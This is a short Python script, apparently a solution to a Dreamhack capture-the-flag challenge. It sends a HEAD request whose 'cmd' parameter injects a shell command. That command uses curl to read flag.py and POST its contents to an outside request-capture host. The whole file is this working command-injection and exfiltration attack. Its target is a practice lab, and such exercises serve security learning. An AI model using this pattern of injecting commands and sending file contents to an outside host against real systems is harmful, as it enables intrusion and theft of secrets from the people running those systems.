import requests, sys

if __name__ == "__main__":
  url = 'http://host3.dreamhack.games:11433?cmd=curl%20-d%20"$(cat flag.py)"%20-X%20POST%20https://wilkiav.request.dreamhack.games'
  res = requests.head(url)
  print(res.text)